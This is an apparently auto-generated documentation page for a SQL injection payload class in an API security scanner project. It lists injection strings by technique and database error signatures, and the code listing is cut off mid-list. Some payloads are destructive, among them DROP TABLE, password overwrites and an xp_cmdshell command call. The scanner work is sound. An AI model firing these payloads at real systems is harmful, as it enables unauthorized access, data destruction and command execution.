@@ -1,0 +1,148 @@
+# SQLiPayloads
+
+**Type:** Class Documentation
+**Repository:** Cybersecurity-Projects
+**File:** PROJECTS/intermediate/api-security-scanner/backend/scanners/payloads.py
+**Language:** python
+**Lines:** 7-148
+**Complexity:** 0.0
+
+---
+
+## Source Code
+
+```python
+class SQLiPayloads:
+    """
+    SQL Injection test payloads covering various database types and techniques
+    """
+
+    ERROR_SIGNATURES = {
+        "mysql": [
+            "sql syntax",
+            "mysql_fetch",
+            "mysql_num_rows",
+            "warning: mysql",
+            "mysqli",
+            "mysql error",
+            "mysql_",
+        ],
+        "postgres": [
+            "postgresql",
+            "pg_query",
+            "pg_exec",
+            "error: syntax error",
+            "pg_",
+            "pgsql",
+            "postgres error",
+        ],
+        "mssql": [
+            "odbc sql server",
+            "sqlserver jdbc driver",
+            "msg ",
+            "sqlexception",
+            "microsoft sql",
+            "sql server",
+        ],
+        "oracle": [
+            "ora-",
+            "oracle.jdbc",
+            "oracle error",
+            "oracle database",
+            "pl/sql",
+        ],
+    }
+
+    BASIC_AUTHENTICATION_BYPASS = [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "' OR 1=1#",
+        "' OR 1=1/*",
+        "admin'--",
+        "admin'#",
+        "admin'/*",
+        "' or 1=1--",
+        "' or 1=1#",
+        "' or 1=1/*",
+        ") or '1'='1--",
+        ") or ('1'='1--",
+    ]
+
+    UNION_BASED = [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION ALL SELECT NULL--",
+        "' UNION ALL SELECT NULL,NULL--",
+        "1' UNION SELECT NULL,NULL,NULL--",
+        "1' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
+        "' UNION SELECT username,password FROM users--",
+        "' UNION SELECT NULL,version()--",
+        "' UNION SELECT NULL,database()--",
+    ]
+
+    TIME_BASED_BLIND = [
+        "'; WAITFOR DELAY '0:0:5'--",
+        "1'; WAITFOR DELAY '0:0:5'--",
+        "'; SELECT SLEEP(5)--",
+        "1'; SELECT SLEEP(5)--",
+        "'; BENCHMARK(5000000,MD5('test'))--",
+        "1' AND SLEEP(5)--",
+        "1' OR SLEEP(5)--",
+        "'; pg_sleep(5)--",
+        "1'; pg_sleep(5)--",
+    ]
+
+    BOOLEAN_BASED_BLIND = [
+        "1' AND '1'='1",
+        "1' AND '1'='2",
+        "1' AND 1=1--",
+        "1' AND 1=2--",
+        "1' AND SUBSTRING(version(),1,1)='5'--",
+        "1' AND ASCII(SUBSTRING(database(),1,1))>97--",
+        "' AND (SELECT COUNT(*) FROM users)>0--",
+        "' AND (SELECT LENGTH(database()))>0--",
+    ]
+
+    ERROR_BASED = [
+        "' AND 1=CONVERT(int,(SELECT @@version))--",
+        "' AND 1=CAST((SELECT @@version) AS int)--",
+        "' AND extractvalue(1,concat(0x7e,version()))--",
+        "' AND updatexml(1,concat(0x7e,version()),1)--",
+        "' AND exp(~(SELECT * FROM (SELECT 1)x))--",
+        "' OR 1 GROUP BY CONCAT_WS(0x3a,version(),floor(rand()*2)) HAVING MIN(0)--",
+    ]
+
+    STACKED_QUERIES = [
+        "'; DROP TABLE users--",
+        "'; INSERT INTO users VALUES('hacker','password')--",
+        "'; UPDATE users SET password='hacked'--",
+        "'; EXEC xp_cmdshell('whoami')--",
+  
+```
+
+---
+
+## Class Documentation
+
+### SQLiPayloads
+
+**Class Responsibility and Purpose:**
+The `SQLiPayloads` class is responsible for providing a comprehensive collection of SQL Injection test payloads tailored to different database types and techniques. It aims to help security scanners identify potential vulnerabilities by simulating various injection attacks.
+
+**Public Interface:**
+- **get_all_payloads()**: Returns a combined list of all SQL injection payloads.
+- **get_error_signatures()**: Provides error signatures for detecting specific database types, aiding in the identification of the underlying database system during an attack.
+
+**Design Patterns Used:**
+The class does not explicitly use any design patterns. However, it follows a modular approach by organizing different payload categories (e.g., `BASIC_AUTHENTICATION_BYPASS`, `UNION_BASED`) as separate attributes, which can be seen as a form of encapsulation and modularity.
+
+**Relationship to Other Classes:**
+This class is part of the backend module for an API security scanner. It interacts with other classes that handle scanning logic by providing payloads and error signatures. The payloads are used during the scanning process to test for SQL injection vulnerabilities, while the error signatures help in identifying the database type based on the response.
+
+**State Management Approach:**
+The class maintains a static state through its attributes (`ERROR_SIGNATURES`, `BASIC_AUTHENTICATION_BYPASS`, etc.), which do not change once initialized. The methods are class methods, allowing them to be called without instantiating the class.
+
+---
+
+*Generated by CodeWorm on 2026-02-18 11:34*
